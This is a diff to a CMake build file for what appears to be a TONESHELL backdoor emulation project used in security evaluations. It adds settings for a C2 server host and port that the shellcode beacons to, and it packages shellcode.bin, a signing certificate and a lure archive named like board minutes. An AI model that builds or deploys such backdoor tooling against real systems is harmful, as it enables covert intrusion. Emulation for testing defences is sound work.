@@ -7,6 +7,12 @@ project("TONESHELL" DESCRIPTION "TONESHELL Backdoor and Protections Test 4 Compo
 message("Compiler ID: ${CMAKE_CXX_COMPILER_ID}")
 message("Compiler Version: ${CMAKE_CXX_COMPILER_VERSION}")
 
+set(TONESHELL_LOG_DIR "C:/Windows/Temp" CACHE STRING "Directory for runtime log files (user-writable path avoids requiring admin)")
+set(TONESHELL_C2_HOST "192.168.56.2" CACHE STRING "C2 server host/IP that the TONESHELL shellcode beacons to")
+set(TONESHELL_C2_PORT "8443" CACHE STRING "C2 server port that the TONESHELL shellcode beacons to")
+message(STATUS "TONESHELL log dir: ${TONESHELL_LOG_DIR}")
+message(STATUS "TONESHELL C2:      ${TONESHELL_C2_HOST}:${TONESHELL_C2_PORT}")
+
 # Set up Google Tests
 include(FetchContent)
 FetchContent_Declare(
@@ -30,9 +36,9 @@ enable_testing()
 FetchContent_Declare(
     assemblyline
     GIT_REPOSITORY
-        "git@github.com:attackevals/assemblyline.git"
+        "https://github.com/robleh/assemblyline.git"
     GIT_TAG
-        "a1ee49a9bd61955a738ef9a17d83a63bf310edff"
+        "1e7e7bbcbf8a340250bd3aaf6f8f06a645fca495"
 )
 FetchContent_MakeAvailable(assemblyline)
 
@@ -59,7 +65,7 @@ install(
 install(
     FILES
     "$<TARGET_FILE_DIR:shellcode-pe>/shellcode.bin"
-    "$<TARGET_FILE_DIR:wsdapi>/250325_Pentos_Board_Minutes.rar"
+    "$<TARGET_FILE_DIR:wsdapi>/250325_Pentos_Board_Minutes.zip"
     "$<TARGET_FILE_DIR:wsdapi>/toneshell.pfx"
     "${CMAKE_SOURCE_DIR}/src/wsdapi/embedded.hpp"
     "${CMAKE_SOURCE_DIR}/src/test4/dropper/d_embedded.hpp"
